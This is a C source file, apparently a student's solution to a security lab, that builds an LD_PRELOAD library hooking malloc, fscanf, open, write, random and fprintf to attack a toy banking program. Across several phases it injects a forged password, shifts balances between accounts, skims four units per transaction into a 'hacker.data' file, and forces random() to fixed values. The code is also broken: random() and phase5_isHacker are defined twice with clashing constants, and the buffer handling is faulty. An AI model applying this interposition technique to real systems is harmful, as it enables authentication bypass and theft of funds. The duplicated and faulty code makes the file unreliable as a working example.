#include<stdint.h>
#include<stdio.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include<stdlib.h>

/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2.cpp, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();

static int ignoreMalloc = 0;

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


char* phaseNum = "-1";





int fscanf(FILE *stream, const char *format, ...) {

	int rc;
	va_list ap;
	va_start(ap, format);
	if (strcmp(format, "%ms") == 0) {
		/* PHASE 1 */
		phaseNum = "1";
		char *turtleString = "turtle";
		char *username = getlogin();
		char *password = (char*)malloc(12);
	  if ( password != NULL ) {
	     strcpy(password, turtleString);
	     strcat(password, username);
	  }
		FILE* passFile = fmemopen(password, 12, "r");
	  rc = vfscanf(passFile, format, ap);
	}
	else {
		rc = vfscanf(stream, format, ap);
	}
	va_end(ap);
	return rc;
}



int open(const char *pathname, int flags, ...) {

	static int (*origopen)(const char *pathname, int flags,...) = NULL;
	origopen = (int (*)(const char*, int, ...))dlsym(RTLD_NEXT, "open");

	// /* PHASE 5 */
	// if (strcmp(phaseNum, "5") == 0) {
	// 	if (phase5_isHacker) {
	// 		int rc = origopen("hacker.data", flags, 0600);
	// 		printf("file descriptor: %d\n", rc);
	// 		return rc;
	// 	}
	// 	phase5_isHacker = !phase5_isHacker;
	// }

	// Store the phase number
	if (isdigit(*pathname)) {
		phaseNum = pathname;
	}

	// To fix unable to open file error
	mode_t openMode;
	if (strcmp(phaseNum, "0")==0)  {
		openMode = 0600;
		return origopen(pathname, flags, openMode);
	}
	if (strcmp(phaseNum, "1")==0)  {
		openMode = 00;
		return origopen(pathname, flags, openMode);
	}

	return origopen(pathname, flags);
}


/* FILE *fopen(const char *filename, const char *mode) {

	static FILE* (*origfopen)(const char *filename, const char *mode) = NULL;
	origfopen = (FILE* (*)(const char*, const char *))dlsym(RTLD_NEXT, "fopen");
	origfopen(filename, mode);

} */

int phase4_skim = 0;
int phase4_hacker_bal;
int phase4_start = 1;


int debugIndex = 0;

ssize_t write(int fd, const void *buf, size_t count) {
	static ssize_t (*origwrite)(int fd, const void *buf, size_t count) = NULL;
	origwrite = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");

	if (strcmp(phaseNum, "2")==0) {

		if (fd == 4) { // alice
			int currBal = atoi((char*)buf);
			currBal = currBal + 200;
			char temp_buffer[5];
			snprintf(temp_buffer, 5, "%d", currBal);
			buf = (const void*)temp_buffer;
		}

		else if (fd == 3) { // bob
			int currBal = atoi((char*)buf);
			currBal = currBal - 200;
			char temp_buffer[5];
			snprintf(temp_buffer, 5, "%d", currBal);
			buf = (const void*)temp_buffer;
		}
	}

	/* PHASE 4 */
	if (strcmp(phaseNum, "4")==0) {
		if (phase4_start) {
			int hackerFd = open("hacker.data", 2, 0600);
			char* hackerBuffer = malloc(5);
			read(hackerFd, &hackerBuffer, 5);
			phase4_hacker_bal = atoi(hackerBuffer);
			free(hackerBuffer);
			phase4_start = 0;
			close(hackerFd);
		}
		if(phase4_skim) {
			/* skim off transaction */

			// decrement balance of receiver by 4
			int currBal;
			sscanf(buf, "%d", &currBal);
			currBal = currBal - 4;

			// convert back to void *
			int acctBalStringLength = snprintf( NULL, 0, "%d", currBal );
			char *temp_buffer = malloc(acctBalStringLength+1);
			snprintf(temp_buffer, acctBalStringLength+1, "%d", currBal);
			buf = (memcpy(buf, temp_buffer, acctBalStringLength+1));
			free(temp_buffer);

			// increment hacker balance by 4
			phase4_hacker_bal = phase4_hacker_bal + 4;

			// convert back to void *
			int hackerBalStringLength = snprintf( NULL, 0, "%d", phase4_hacker_bal);
			char *hackerBuffer = malloc(hackerBalStringLength+1);
			snprintf(hackerBuffer, hackerBalStringLength+1, "%d", phase4_hacker_bal);

			FILE *hackerFilePointer = fopen("hacker.data", "w");
			fprintf(hackerFilePointer, "%s", hackerBuffer);
			free(hackerBuffer);
			fclose(hackerFilePointer);
		}
		phase4_skim = !phase4_skim;
	}

	return origwrite(fd, buf, count);
}

int phase5_isHacker = 0;
long int random() {
	static long int (*origRandom)() = NULL;
	origRandom = (long int (*)())dlsym(RTLD_NEXT, "random");

	if (strcmp(phaseNum, "5") == 0) {
		if (phase5_isHacker) {
			return 2007395863;
		}
		phase5_isHacker = !phase5_isHacker;
	}
	return origRandom();
}


int fprintf(FILE * restrict stream, const char * restrict format, ...){
	int rc;
	va_list ap;
	va_start(ap, format);
	if (strcmp(phaseNum, "4")==0) {
		/* RESET PHASE 4 */
		phase4_start = 1;
		phase4_skim = 0;
	  }
	
	rc = vfprintf(stream, format, ap);

	va_end(ap);
	return rc;
}


int phase5_isHacker = 0;
long int random() {
	static long int (*origRandom)() = NULL;
	origRandom = (long int (*)())dlsym(RTLD_NEXT, "random");

	if (strcmp(phaseNum, "5") == 0) {
		if (phase5_isHacker) {
			return 861794895;
		}


	phase5_isHacker = !phase5_isHacker;
	}
	return origRandom();
}

__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}
